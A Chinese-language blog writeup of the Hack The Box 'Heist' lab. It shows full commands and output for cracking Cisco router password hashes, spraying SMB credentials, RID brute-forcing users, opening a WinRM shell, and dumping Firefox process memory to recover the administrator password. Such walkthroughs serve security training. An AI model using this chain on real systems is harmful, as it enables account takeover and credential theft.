<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><link rel="preload" as="font" href="/_next/static/media/2aaf0723e720e8b9-s.p.woff2" crossorigin="" type="font/woff2"/><link rel="stylesheet" href="/_next/static/css/7049305331e382c9.css" data-precedence="next"/><title>HTB heist Writeup</title><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="any"/><meta name="next-size-adjust"/><script src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js" noModule=""></script></head><body class="antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4"><script>!function(){try{var d=document.documentElement,c=d.classList;c.remove('light','dark');var e=localStorage.getItem('theme');if('system'===e||(!e&&true)){var t='(prefers-color-scheme: dark)',m=window.matchMedia(t);if(m.media!==t||m.matches){d.style.colorScheme = 'dark';c.add('dark')}else{d.style.colorScheme = 'light';c.add('light')}}else if(e){c.add(e|| '')}if(e==='light'||e==='dark')d.style.colorScheme=e}catch(e){}}()</script><div class="my-max mx-auto py-10 px-4"><header><div class="my-flex"><nav class="nav-ml text-sm font-medium space-x-6"><a href="/">Home</a><a href="/about">About</a></nav></div></header><main><div class="js-toc my-toc"></div><article class="py-6 prose post-prose dark:prose-invert"><div class="post-title">HTB heist Writeup</div><time dateTime="2019-12-11T22:02:56.000Z" class="post-time">December 11, 2019</time><div class="js-toc-content"><h1 id="前言">前言</h1>
<p>这是一篇writeup，靶机是来自hackthebox的<a href="https://www.hackthebox.eu/home/machines/profile/201">heist</a></p>
<h1 id="信息收集">信息收集</h1>
<p>使用nmap扫一下端口</p>
<pre><code class="hljs language-bash">$ nmap -p- -sV -sC -sS 10.10.10.149
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-11 09:53 EST
Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.149
Host is up (0.19s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not <span class="hljs-built_in">set</span>
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49668/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 38s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   <span class="hljs-built_in">date</span>: 2019-12-11T15:58:12
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3906.87 seconds
</code></pre>
<p>80 web服务 445 smb服务 5985 winrm 135/49968 rpc</p>
<h1 id="web">Web</h1>
<p>主机上开着Web服务，打开是一个登录页面。页面上有个以游客访问的功能，可以看到里面有人上传的一个配置文件：</p>
<pre><code>version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh

</code></pre>
<p>从配置文件中可以得到几个账号密码：</p>
<table><thead><tr><th>账号</th><th>密码</th><th align="left">加密类型</th></tr></thead><tbody><tr><td>???</td><td>$1$pdQG$o8nrSzsGXeaduXrjlvKc91</td><td align="left">Type 5</td></tr><tr><td>rout3r</td><td>0242114B0E143F015F5D1E161713</td><td align="left">Type 7</td></tr><tr><td>admin</td><td>02375012182C1A1D751618034F36415408</td><td align="left">Type 7</td></tr></tbody></table>
<p>结合网页描述来看这是一个思科路由器的配置文件，但是很明显都是以上经过加密的密码。查了一下Type 7是可以直接解密的，但是Type 5就没有那么容易了，只能爆破。</p>
<p>对于Type 7直接用<a href="http://www.ifm.net.nz/cookbooks/passwordcracker.html">在线的解密工具</a>（当然这个网站可以解密Type 5的，但是耗时多），得到两个密码<code>$uperP@ssword</code>，<code>Q4)sJu\Y8qz*A3?d</code></p>
<p>对于Type 5的我就直接用john（<a href="https://klionsec.github.io/2017/04/26/use-john/">相关文章</a>）来解密了。</p>
<pre><code class="hljs language-bash">➜  heist  <span class="hljs-built_in">cat</span> hash.txt
$1$pdQG<span class="hljs-variable">$o8nrSzsGXeaduXrjlvKc91</span>
➜  heist  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;md5crypt&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;md5crypt-long&quot;</span>
Use the <span class="hljs-string">&quot;--format=md5crypt-long&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead
Using default input encoding: UTF-8
Loaded 1 password <span class="hljs-built_in">hash</span> (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
No password hashes left to crack (see FAQ)
➜  heist  john hash.txt --show
?:stealth1agent
</code></pre>
<p>得到一个密码：<code>stealth1agent</code> 。但对应的账号名是不清楚的，看了网上的文章都猜测是这个附件的上传者<code>Hazard</code>。</p>
<h1 id="get-shell">Get Shell</h1>
<p>我知道服务器上开了smb（445端口）和winrm（5985端口）两个服务，都可以远程连接。</p>
<p>尝试使用smb匿名登录</p>
<pre><code class="hljs language-bash">root@kali ~/Code/htb/heist <span class="hljs-comment"># smbmap -H 10.10.10.149</span>
[+] Finding open SMB ports....
root@kali ~/Code/htb/heist <span class="hljs-comment"># smbclient -N -L 10.10.10.149</span>
session setup failed: NT_STATUS_ACCESS_DENIED
</code></pre>
<p>没有权限。那只能用刚刚解密的账号密码试试了。使用<a href="https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Credentials">CrackMapExec</a>来进行爆破（成功了就会停止，可以使用<code>--continue-on-success</code>继续爆破）：</p>
<pre><code class="hljs language-bash">heist <span class="hljs-comment"># crackmapexec smb 10.10.10.149 -u users -p passwords</span>
CME          10.10.10.149:445 SUPPORTDESK     [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SUPPORTDESK)
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\admin:stealth1agent STATUS_LOGON_FAILURE
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\admin:<span class="hljs-variable">$uperP</span>@ssword STATUS_LOGON_FAILURE
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\rout3r:stealth1agent STATUS_LOGON_FAILURE
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\rout3r:<span class="hljs-variable">$uperP</span>@ssword STATUS_LOGON_FAILURE
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
CME          10.10.10.149:445 SUPPORTDESK     [+] SUPPORTDESK\hazard:stealth1agent
</code></pre>
<p>获得正确的账号密码：hazard/stealth1agent</p>
<p>但是同样的尝试登录winrm却不成功，说明这个账号没有登录winrm的权限，应该还有别的账号密码。</p>
<pre><code class="hljs language-bash">heist <span class="hljs-comment"># crackmapexec winrm -u users -p passwords</span>
[*] KTHXBYE!
</code></pre>
<p>使用<code>smbmap</code>用刚刚得到的账号密码进行登录</p>
<pre><code class="hljs language-bash">heist <span class="hljs-comment"># smbmap -H 10.10.10.149 -u hazard -p stealth1agent</span>
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.149...
[+] IP: 10.10.10.149:445	Name: 10.10.10.149
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	.
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	InitShutdown
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	lsass
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	ntsvcs
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	scerpc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-378-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	epmapper
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-1e8-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	LSM_API_service
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	eventlog
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-448-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	atsvc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-5ec-0
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	wkssvc
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	spoolss
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-a10-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	trkwks
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	W32TIME_ALT
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-288-0
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	vgauth-service
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	srvsvc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-278-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	ROUTER
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	gecko-crash-server-pipe.5428
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	chrome.5428.0.190032358
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	chrome.5428.1.96034004
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	chrome.5428.2.10178136
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	chrome.5428.3.201281206
	.............(省略很多chrome)
	IPC$                                              	READ ONLY	Remote IPC
</code></pre>
<p>可以发现权限很少，但其中有个IPC$有可读权限。IPC$（<a href="http://smallvoid.com/article/winnt-ipc-share.html">文档</a>，<a href="https://www.cnblogs.com/backlion/p/7401609.html">相关</a>，<a href="https://www.jianshu.com/p/a578db79e117">相关</a>）是通过RPC实现的，文档说可以查看所有的共享文件、用户等等功能。事不宜迟，马上用RPC连接一波。</p>
<pre><code class="hljs language-bash">heist <span class="hljs-comment"># rpcclient -U &#x27;hazard%stealth1agent&#x27; 10.10.10.149</span>
rpcclient $&gt; lookupnames hazard
hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
rpcclient $&gt; lookupnames administrator
administrator S-1-5-21-4254423774-1266059056-3197185112-500 (User: 1)
</code></pre>
<p>一个用户有一个对应的SID，SID有几部分组成，对于一个计算机上的SID，不同用户只有最后一部分不一样，这一部分叫做RID，用来标志不同的用户（上面的命令返回也可以看到两个账号的sid只有最后不一样）。rpc命令中可以通过sid查询用户名，所以可以自己写个脚本遍历rid来获得账号。当然还可以用工具啦。还是使用刚刚的CrackMapExec，带上参数<code>--rid-brute</code></p>
<pre><code class="hljs language-bash">(CrackMapExec) CrackMapExec[master] <span class="hljs-comment"># cme smb 10.10.10.149 -u hazard -p stealth1agent --rid-brute</span>
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SUPPORTDESK) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [+] SUPPORTDESK\hazard:stealth1agent
SMB         10.10.10.149    445    SUPPORTDESK      [+] Brute forcing RIDs
SMB         10.10.10.149    445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)
SMB         10.10.10.149    445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)
</code></pre>
<p>得到三个新的用户<code>support</code>、<code>Chase</code>、<code>Jason</code>。再尝试登录一遍，可以得到正确的账号密码：chase / ‘Q4)sJu\Y8qz*A3?d</p>
<p>这时再用这个账号试试登录winrm。使用<a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>工具Get Shell。</p>
<pre><code class="hljs language-bash"><span class="hljs-comment"># evil-winrm -i 10.10.10.149 -u Chase -p &#x27;Q4)sJu\Y8qz*A3?d&#x27;</span>

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Chase\Documents&gt; <span class="hljs-built_in">whoami</span>
supportdesk\chase
*Evil-WinRM* PS C:\Users\Chase\Documents&gt; <span class="hljs-built_in">cd</span> ..\Desktop
*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; <span class="hljs-built_in">cat</span> user.txt
a127d***********
</code></pre>
<h1 id="提权">提权</h1>
<p>翻看了一下服务器，种种迹象都指向这个firefox，而且进程中还有firefox。</p>
<pre><code class="hljs language-bash">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; <span class="hljs-built_in">cat</span> todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access <span class="hljs-keyword">for</span> guest user.
*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; <span class="hljs-built_in">cd</span> ..\appdata\roaming
*Evil-WinRM* PS C:\Users\Chase\appdata\roaming&gt; <span class="hljs-built_in">ls</span>


    Directory: C:\Users\Chase\appdata\roaming


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/22/2019   7:14 AM                Adobe
d---s-        4/22/2019   7:14 AM                Microsoft
d-----        4/22/2019   8:01 AM                Mozilla


*Evil-WinRM* PS C:\Users\Chase\appdata\roaming&gt; ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    458      18     2308       5504               408   0 csrss
    296      17     2400       5292               492   1 csrss
    358      15     3592      14644              5232   1 ctfmon
    166       9     1896       9808       0.03   3308   1 dllhost
    257      14     4120      13536              3928   0 dllhost
    616      35    34804      60416              1012   1 dwm
   1496      58    23944      78636              5620   1 explorer
   1137      71   139216     178680      40.83    432   1 firefox
    408      32    17008      62692       2.92    516   1 firefox
    343      19     9976      37424       0.13   1700   1 firefox
    390      33    54340      86268     104.78   4860   1 firefox
    *********(省略)
</code></pre>
<p>我们知道80端口的Web服务需要登录，也许firefox内存的中藏有密码。</p>
<p>上传procdump工具到windows中，将firefox进程dump下来</p>
<pre><code class="hljs language-bash">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; upload procdump.exe 06.exe
[*] uploading  : procdump.exe -&gt; 06.exe
[*] Uploaded 467.19 KiB of 467.19 KiB (100.0%): procdump.exe -&gt; 06.exe
[*] uploaded   : procdump.exe -&gt; 06.exe

*Evil-WinRM* PS C:\Users\Chase\Desktop&gt;.\06.exe -ma 516 -accepteula

ProcDump v6.00 - Writes process dump files
Copyright (C) 2009-2013 Mark Russinovich
Sysinternals - www.sysinternals.com
With contributions from Andrew Richards

Writing dump file C:\Users\Chase\Desktop\firefox_191106_223459.dmp ...
Writing 293MB. Estimated time (less than) 9 seconds.
Dump written.

meterpreter &gt; download firefox_191106_223459.dmp ./
[*] Downloading: firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp
[*] Downloaded 1.00 MiB of 286.62 MiB (0.35%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp
[*] Downloaded 2.00 MiB of 286.62 MiB (0.7%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp
[*] Downloaded 3.00 MiB of 286.62 MiB (1.05%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp
[*] Downloaded 4.00 MiB of 286.62 MiB (1.4%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp
[*] Downloaded 5.00 MiB of 286.62 MiB (1.74%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp
</code></pre>
<p>下载到本地后搜索一下密码，字段就搜80端口的登录密码的字段就行：</p>
<pre><code class="hljs language-bash">kali at ~ ❯ strings firefox.exe_191214_145906.dmp | grep login_password
<span class="hljs-string">&quot;C:\Program Files\Mozilla Firefox\firefox.exe&quot;</span> localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
</code></pre>
<p>然后登录一下就完事了</p>
<pre><code class="hljs language-bash">kali at ~ ❯ evil-winrm -i 10.10.10.149 -u administrator -p <span class="hljs-string">&#x27;4dD!5}x/re8]FBuZ&#x27;</span>

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="hljs-built_in">cd</span> ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">ls</span>


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/22/2019   9:05 AM             32 root.txt
</code></pre></div></article></main></div><script src="/_next/static/chunks/webpack-7ba84a1b7b37c561.js" async=""></script><script src="/_next/static/chunks/2443530c-ac8981f6a5707b30.js" async=""></script><script src="/_next/static/chunks/139-1dec130228ce3944.js" async=""></script><script src="/_next/static/chunks/main-app-2fe6bc2bab605f4b.js" async=""></script></body></html><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/media/2aaf0723e720e8b9-s.p.woff2\",{\"as\":\"font\",\"type\":\"font/woff2\"}]\n2:HL[\"/_next/static/css/7049305331e382c9.css\",{\"as\":\"style\"}]\n0:\"$L3\"\n"])</script><script>self.__next_f.push([1,"4:I{\"id\":\"7858\",\"chunks\":[\"272:static/chunks/webpack-7ba84a1b7b37c561.js\",\"667:static/chunks/2443530c-ac8981f6a5707b30.js\",\"139:static/chunks/139-1dec130228ce3944.js\"],\"name\":\"\",\"async\":false}\n6:I{\"id\":\"3055\",\"chunks\":[\"272:static/chunks/webpack-7ba84a1b7b37c561.js\",\"667:static/chunks/2443530c-ac8981f6a5707b30.js\",\"139:static/chunks/139-1dec130228ce3944.js\"],\"name\":\"\",\"async\":false}\n7:I{\"id\":\"350\",\"chunks\":[\"414:static/chunks/414-bfaafd372e832af9.js\",\"185:static/chunks/app/layout-4bf769380402ef59.js\"],\"name"])</script><script>self.__next_f.push([1,"\":\"ThemeProvider\",\"async\":false}\n8:I{\"id\":\"414\",\"chunks\":[\"414:static/chunks/414-bfaafd372e832af9.js\",\"185:static/chunks/app/layout-4bf769380402ef59.js\"],\"name\":\"\",\"async\":false}\n9:I{\"id\":\"1234\",\"chunks\":[\"414:static/chunks/414-bfaafd372e832af9.js\",\"185:static/chunks/app/layout-4bf769380402ef59.js\"],\"name\":\"Analytics\",\"async\":false}\na:I{\"id\":\"9544\",\"chunks\":[\"272:static/chunks/webpack-7ba84a1b7b37c561.js\",\"667:static/chunks/2443530c-ac8981f6a5707b30.js\",\"139:static/chunks/139-1dec130228ce3944.js\"],\"name\":\"\""])</script><script>self.__next_f.push([1,",\"async\":false}\nb:I{\"id\":\"99\",\"chunks\":[\"272:static/chunks/webpack-7ba84a1b7b37c561.js\",\"667:static/chunks/2443530c-ac8981f6a5707b30.js\",\"139:static/chunks/139-1dec130228ce3944.js\"],\"name\":\"\",\"async\":false}\n"])</script><script>self.__next_f.push([1,"3:[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/7049305331e382c9.css\",\"precedence\":\"next\"}]],[\"$\",\"$L4\",null,{\"assetPrefix\":\"\",\"initialCanonicalUrl\":\"/posts/htb-heist\",\"initialTree\":[\"\",{\"children\":[\"posts\",{\"children\":[[\"slug\",\"htb-heist\",\"c\"],{\"children\":[\"__PAGE__?{\\\"slug\\\":[\\\"htb-heist\\\"]}\",{}]}]}]},\"$undefined\",\"$undefined\",true],\"initialHead\":[\"$L5\",[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\"}]],\"globalErrorComponent\":\"$6\",\"notFound\":[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"className\":\"antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4\",\"children\":[\"$\",\"$L7\",null,{\"attribute\":\"class\",\"defaultTheme\":\"system\",\"enableSystem\":true,\"children\":[[\"$\",\"div\",null,{\"className\":\"my-max mx-auto py-10 px-4\",\"children\":[[\"$\",\"header\",null,{\"children\":[\"$\",\"div\",null,{\"className\":\"my-flex\",\"children\":[\"$\",\"nav\",null,{\"className\":\"nav-ml text-sm font-medium space-x-6\",\"children\":[[\"$\",\"$L8\",null,{\"href\":\"/\",\"children\":\"Home\"}],[\"$\",\"$L8\",null,{\"href\":\"/about\",\"children\":\"About\"}]]}]}]}],[\"$\",\"main\",null,{\"children\":[\"$undefined\",[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]]]}]]}],[\"$\",\"$L9\",null,{}]]}]}]}],\"asNotFound\":false,\"children\":[[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"className\":\"antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4\",\"children\":[\"$\",\"$L7\",null,{\"attribute\":\"class\",\"defaultTheme\":\"system\",\"enableSystem\":true,\"children\":[[\"$\",\"div\",null,{\"className\":\"my-max mx-auto py-10 px-4\",\"children\":[[\"$\",\"header\",null,{\"children\":[\"$\",\"div\",null,{\"className\":\"my-flex\",\"children\":[\"$\",\"nav\",null,{\"className\":\"nav-ml text-sm font-medium space-x-6\",\"children\":[[\"$\",\"$L8\",null,{\"href\":\"/\",\"children\":\"Home\"}],[\"$\",\"$L8\",null,{\"href\":\"/about\",\"children\":\"About\"}]]}]}]}],[\"$\",\"main\",null,{\"children\":[\"$\",\"$La\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$\",\"$La\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"posts\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$\",\"$La\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"posts\",\"children\",[\"slug\",\"htb-heist\",\"c\"],\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$Lc\",null],\"segment\":\"__PAGE__?{\\\"slug\\\":[\\\"htb-heist\\\"]}\"},\"styles\":[]}],\"segment\":[\"slug\",\"htb-heist\",\"c\"]},\"styles\":[]}],\"segment\":\"posts\"},\"styles\":[]}]}]]}],[\"$\",\"$L9\",null,{}]]}]}]}],null]}]]\n"])</script><script>self.__next_f.push([1,"d:I{\"id\":\"1753\",\"chunks\":[\"110:static/chunks/110-fa1ef238a86eb8d6.js\",\"49:static/chunks/app/posts/[...slug]/page-b5cd823d07a42590.js\"],\"name\":\"\",\"async\":false}\n"])</script><script>self.__next_f.push([1,"c:[[\"$\",\"$Ld\",null,{}],[\"$\",\"article\",null,{\"className\":\"py-6 prose post-prose dark:prose-invert\",\"children\":[[\"$\",\"div\",null,{\"className\":\"post-title\",\"children\":\"HTB heist Writeup\"}],[\"$\",\"time\",null,{\"dateTime\":\"2019-12-11T22:02:56.000Z\",\"className\":\"post-time\",\"children\":\"December 11, 2019\"}],\"$undefined\",[\"$\",\"div\",null,{\"className\":\"js-toc-content\",\"children\":[[\"$\",\"h1\",null,{\"id\":\"前言\",\"children\":\"前言\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"这是一篇writeup，靶机是来自hackthebox的\",[\"$\",\"a\",null,{\"href\":\"https://www.hackthebox.eu/home/machines/profile/201\",\"children\":\"heist\"}]]}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"信息收集\",\"children\":\"信息收集\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"使用nmap扫一下端口\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-bash\",\"children\":[\"$$ nmap -p- -sV -sC -sS 10.10.10.149\\nStarting Nmap 7.80 ( https://nmap.org ) at 2019-12-11 09:53 EST\\nNmap scan report \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" 10.10.10.149\\nHost is up (0.19s latency).\\nNot shown: 65530 filtered ports\\nPORT      STATE SERVICE       VERSION\\n80/tcp    open  http          Microsoft IIS httpd 10.0\\n| http-cookie-flags:\\n|   /:\\n|     PHPSESSID:\\n|_      httponly flag not \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"set\"}],\"\\n| http-methods:\\n|_  Potentially risky methods: TRACE\\n|_http-server-header: Microsoft-IIS/10.0\\n| http-title: Support Login Page\\n|_Requested resource was login.php\\n135/tcp   open  msrpc         Microsoft Windows RPC\\n445/tcp   open  microsoft-ds?\\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\\n|_http-server-header: Microsoft-HTTPAPI/2.0\\n|_http-title: Not Found\\n49668/tcp open  msrpc         Microsoft Windows RPC\\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\\n\\nHost script results:\\n|_clock-skew: 38s\\n| smb2-security-mode:\\n|   2.02:\\n|_    Message signing enabled but not required\\n| smb2-time:\\n|   \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"date\"}],\": 2019-12-11T15:58:12\\n|_  start_date: N/A\\n\\nService detection performed. 